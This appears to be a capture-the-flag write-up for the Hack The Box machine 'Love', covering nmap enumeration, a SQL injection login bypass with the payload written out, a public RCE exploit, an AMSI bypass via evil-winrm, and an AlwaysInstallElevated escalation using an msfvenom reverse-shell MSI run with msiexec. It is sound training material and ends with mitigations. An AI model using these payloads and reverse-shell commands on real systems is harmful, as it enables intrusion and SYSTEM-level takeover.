## Introduction

In this guide, I targeted a Windows machine named **Love**, which hosts a vulnerable voting system application. During port scanning, I discovered a service running on port 5000, but direct access was restricted. Using a public exploit for the voting system, I bypassed the login panel via SQL injection and authenticated as the user *phoebe*. From there, I exploited a remote code execution vulnerability to gain an initial foothold. Upon enumeration, I identified an AppLocker misconfiguration that allowed me to install and execute a malicious `.msi` file, which granted me a reverse shell as **NT AUTHORITY\SYSTEM**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 139/445

- **smbclient**
    
    ```bash
    smbclient -L //<RHOST>/ -N
    ```
    
    **NT_STATUS_ACCESS_DENIED.**
    

### Port 3306

```bash
mysql -u guest -h $IP -p --ssl=0
```

ERROR 1130 (HY000): Host '10.10.14.12' is not allowed to connect to this MariaDB server

### Port 5985,5986 (WinRM)

## Web

### Port 80

### Port 443

### Port 5000

## Exploitaiton

We can access just port 80, others are forbidden.

Accessing the website at 80 we are greeted with a login page and an application called Voting System.

Searching for public exploits available I found:

- [SQLi Authentication Bypass](https://www.exploit-db.com/exploits/49843)
- [Authenticated RCE](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/49445&ved=2ahUKEwiAw52_psuNAxVLxgIHHc8rLwcQFnoECBcQAQ&usg=AOvVaw3n1GHQ2F1uFcNdOBF79Xem)

Trying the first one:

Maybe number of rows are different.

Determining number of rows:

![image.png](image%203.png)

![image.png](image%204.png)

It is 6.

That means we need to delete one row from username field:

`dsfgdf' UNION SELECT 1,2,"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K",4,5,6 from INFORMATION_SCHEMA.SCHEMATA;-- -`

That worked and we are logged in.

But nothing to do here, I ran Gobuster and found `admin` page, and noticed that exploit actually directed for `admin/login.php` . 

**Gobuster Scan**

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x .php -b 400,403,404
```

I used the payload and logged in.

Then I shifted to trying the second exploit.

```bash
python3 49445.py
```

## Privilege Escalation

Analysing web root I found:

I found also MySQL credentials:

![image.png](image%2011.png)

I noticed that box restricts usage of executables and scripts I used obtained `phoebe` credentials to connect with `evil-winrm` and run `Bypass-4MSI`, that way I can import PowerShell modules.

Running PowerUp.ps1 I see that `AlwaysInstallElevated` registry key is set.

![image.png](image%2012.png)

MSI (Microsoft Installer) packages are files with the `.msi` extension used for installing, updating, and uninstalling software on Windows. `AlwaysInstallElevated` means Windows will try to install `.msi` as NT Authority\System, and if we put malicious `.msi` reverse shell it will be run as NT Authority\System.

```bash
 msfvenom -p windows/x64/shell_reverse_tcp lhost=<ip> lport=<port> -f msi -o reverse.msi  #reverse shell

```

```powershell
msiexec /quiet /qn /i .\reverse.msi
```

## Credentials

```bash
Vote Admin Creds admin: @LoveIsInTheAir!!!!
phoebe : HTB#9826^(_  MySQL
```

## Mitigation

- Implement proper input sanitization to prevent SQL injection, especially in authentication mechanisms.
- Regularly patch known vulnerabilities in web applications and third-party services.
- Enforce AppLocker rules with strict whitelisting and monitor for unauthorized executable files.
- Limit user privileges and apply the principle of least privilege.
- Monitor for unusual `.msi` executions and review system logs for suspicious activity.
